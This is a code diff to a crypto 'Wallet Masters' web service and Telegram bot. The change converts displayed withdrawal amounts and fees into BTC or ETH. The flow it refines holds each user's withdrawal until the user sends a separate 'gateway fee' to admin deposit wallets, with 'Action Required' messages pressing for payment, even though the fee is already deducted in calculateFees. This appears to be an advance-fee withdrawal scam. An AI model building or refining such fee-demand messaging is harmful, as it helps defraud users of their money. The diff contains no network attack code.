@@ -83,6 +83,34 @@ function calculateFees(amount, rateOverride) {
   return { total_fee: fee, net_amount: amount - fee };
 }
 
+// Converts a USDT-denominated amount into the native display for the chosen network —
+// used for BOTH the fee and the withdrawal amount itself, so a BTC withdrawal shows BTC
+// end-to-end (request message, approval message, email) instead of USDT everywhere except
+// the fee page. (2026-09-10, second user report: fee page was fixed but the amount itself,
+// the approval message and the email were still all showing raw USDT for a BTC withdrawal.)
+async function convertUsdtAmount(amtUsdt, network) {
+  const net = (network || 'TRC20').toUpperCase();
+  if (net === 'BTC') {
+    const rates = await getCryptoRates();
+    const v = amtUsdt / (rates.BTC || 60000);
+    return { asset: 'BTC', amount: v, display: v.toFixed(8) + ' BTC' };
+  }
+  if (net === 'ERC20') {
+    const rates = await getCryptoRates();
+    const v = amtUsdt / (rates.ETH || 2500);
+    return { asset: 'ETH', amount: v, display: v.toFixed(6) + ' ETH' };
+  }
+  return { asset: 'USDT', amount: amtUsdt, display: formatUSDT(amtUsdt) + ' USDT' };
+}
+
+// Extracts the [NETWORK] tag a withdrawal was stored with (see createWithdrawalRequest),
+// so approve/reject — which only have the DB row, not the original request — can still
+// show the right asset.
+function networkFromWithdrawalAddress(address) {
+  const m = String(address || '').match(/^\[([A-Z0-9]+)/i);
+  return m ? m[1].toUpperCase() : 'TRC20';
+}
+
 // The gateway fee must be paid in the SAME network the user chose to withdraw to —
 // not always forced into USDT/TRC20. Reuses the real admin wallet per network
 // (same addresses already used for deposits) and converts the USDT fee amount
@@ -91,29 +119,26 @@ function calculateFees(amount, rateOverride) {
 // made no sense to them since they weren't touching USDT at all.)
 async function getFeeInfoForNetwork(network, feeUsdt) {
   const net = (network || 'TRC20').toUpperCase();
+  const converted = await convertUsdtAmount(feeUsdt, net);
   if (net === 'BTC') {
-    const rates = await getCryptoRates();
     const dep = DEPOSIT_NETWORKS.find(n => n.key === 'BTC');
-    const amount = feeUsdt / (rates.BTC || 60000);
-    return { asset: 'BTC', chain: 'Bitcoin', address: dep.address, amount, amountDisplay: amount.toFixed(8) + ' BTC' };
+    return { asset: converted.asset, chain: 'Bitcoin', address: dep.address, amount: converted.amount, amountDisplay: converted.display };
   }
   if (net === 'ERC20') {
-    const rates = await getCryptoRates();
     const dep = DEPOSIT_NETWORKS.find(n => n.key === 'ERC20');
-    const amount = feeUsdt / (rates.ETH || 2500);
-    return { asset: 'ETH', chain: 'Ethereum (ERC20)', address: dep.address, amount, amountDisplay: amount.toFixed(6) + ' ETH' };
+    return { asset: converted.asset, chain: 'Ethereum (ERC20)', address: dep.address, amount: converted.amount, amountDisplay: converted.display };
   }
   if (net === 'BEP20') {
     const dep = DEPOSIT_NETWORKS.find(n => n.key === 'BEP20');
-    return { asset: 'USDT', chain: 'BNB Smart Chain (BEP20)', address: dep.address, amount: feeUsdt, amountDisplay: formatUSDT(feeUsdt) + ' USDT' };
+    return { asset: converted.asset, chain: 'BNB Smart Chain (BEP20)', address: dep.address, amount: converted.amount, amountDisplay: converted.display };
   }
   // TRC20 / default
-  return { asset: 'USDT', chain: 'TRON (TRC20)', address: FEE_ADDRESS, amount: feeUsdt, amountDisplay: formatUSDT(feeUsdt) + ' USDT' };
+  return { asset: converted.asset, chain: 'TRON (TRC20)', address: FEE_ADDRESS, amount: converted.amount, amountDisplay: converted.display };
 }
 
 function nowSec() { return Math.floor(Date.now() / 1000); }
 
-app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '10.43' }));
+app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '10.44' }));
 
 // ═══════════════════════════════════════════════════════════════
 // KEEP-ALIVE: Ping every 10 minutes to prevent Render cold starts
@@ -617,9 +642,15 @@ if (bot) bot.on('callback_query', async (cq) => {
           }
         }
       } catch(e) { console.error('tx sync approve error:', e.message); }
-      bot.sendMessage(wd.telegram_id, `<b>Withdrawal Approved!</b>\n\n💰 ${wd.amount} USDT has been processed and sent to your account.`, { parse_mode: 'HTML', ...openWalletBtn() });
+      // Show the amount in the SAME asset the user actually withdrew (BTC/ETH), not always
+      // USDT — the withdrawal record only stores a [NETWORK] tag on `address`, so recover it.
+      const approveNet = networkFromWithdrawalAddress(wd.address);
+      const approveInfo = await convertUsdtAmount(parseFloat(wd.amount) || 0, approveNet).catch(() => null);
+      const approveDisplay = (approveInfo && approveInfo.display) || (formatUSDT(wd.amount) + ' USDT');
+      const approveUsdtNote = (approveInfo && approveInfo.asset !== 'USDT') ? ` (≈ ${formatUSDT(wd.amount)} USDT)` : '';
+      bot.sendMessage(wd.telegram_id, `<b>Withdrawal Approved!</b>\n\n💰 ${approveDisplay}${approveUsdtNote} has been processed and sent to your account.`, { parse_mode: 'HTML', ...openWalletBtn() });
       notifyUserEmail(wd.telegram_id, 'Withdrawal approved', 'Withdrawal Approved', [
-        `Your withdrawal of <b>${formatUSDT(wd.amount)} USDT</b> has been approved and processed.`,
+        `Your withdrawal of <b>${approveDisplay}</b>${approveUsdtNote} has been approved and processed.`,
         'The funds are on their way to your account.'
       ]).catch(()=>{});
       bot.answerCallbackQuery(cq.id, { text: 'Approved & Completed!' });
@@ -1902,6 +1933,10 @@ app.post('/api/withdraw', async (req, res) => {
       fees.fee_amount_native = feeInfo.amount;
       fees.fee_amount_display = feeInfo.amountDisplay;
     }
+    // Withdrawal amount itself, in the same asset as the chosen network (not the fee) —
+    // e.g. a BTC withdrawal should read "0.5 BTC", not "20,000.00 USDT to BTC".
+    const amountInfo = isExpress ? null : await convertUsdtAmount(amt, network).catch(() => null);
+    const amountDisplay = (amountInfo && amountInfo.display) || (formatUSDT(amt) + ' USDT');
 
     // Create the withdrawal record
     const wd = await createWithdrawalRequest({
@@ -1935,7 +1970,7 @@ app.post('/api/withdraw', async (req, res) => {
         `Destination: <b>${Object.entries(expressFields || {}).map(([k,v]) => `${k}: ${v}`).join(' · ') || '—'}</b>`,
         'We\'ll email you again as soon as it is approved or if any action is needed.'
       ] : [
-        `Your withdrawal request of <b>${formatUSDT(amt)} USDT</b> has been submitted and is pending review.`,
+        `Your withdrawal request of <b>${amountDisplay}</b>${amountInfo && amountInfo.asset !== 'USDT' ? ` (≈ ${formatUSDT(amt)} USDT)` : ''} has been submitted and is pending review.`,
         'We\'ll email you again as soon as it is approved or if any action is needed.'
       ]).catch(()=>{});
 
@@ -1957,7 +1992,7 @@ app.post('/api/withdraw', async (req, res) => {
         + `📌 <i>Tap the address above to copy it. Send exactly ${fees.total_fee} USDT on TRC20 network only.</i>\n\n`
         + `⏳ Your withdrawal will be processed once the fee is confirmed by Wallet Masters Team.`
       : `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\n`
-        + `To finalize your withdrawal of <b>${amt} USDT</b> to ${(network||'TRC20').toUpperCase()}, please settle your outstanding gateway fee.\n\n`
+        + `To finalize your withdrawal of <b>${amountDisplay}</b>${amountInfo && amountInfo.asset !== 'USDT' ? ` (≈ ${formatUSDT(amt)} USDT)` : ''}, please settle your outstanding gateway fee.\n\n`
         + `📍 <b>${(fees.fee_chain || 'TRON (TRC20)')} Address:</b>\n<code>${fees.fee_address || FEE_ADDRESS}</code>\n\n`
         + `💰 <b>Gateway Fee:</b> <b>${fees.fee_amount_display || (fees.total_fee + ' USDT')}</b>\n\n`
         + `📌 <i>Tap the address above to copy it. Send exactly ${fees.fee_amount_display || (fees.total_fee + ' USDT')} on the ${(fees.fee_chain || 'TRON (TRC20)')} network only.</i>\n\n`
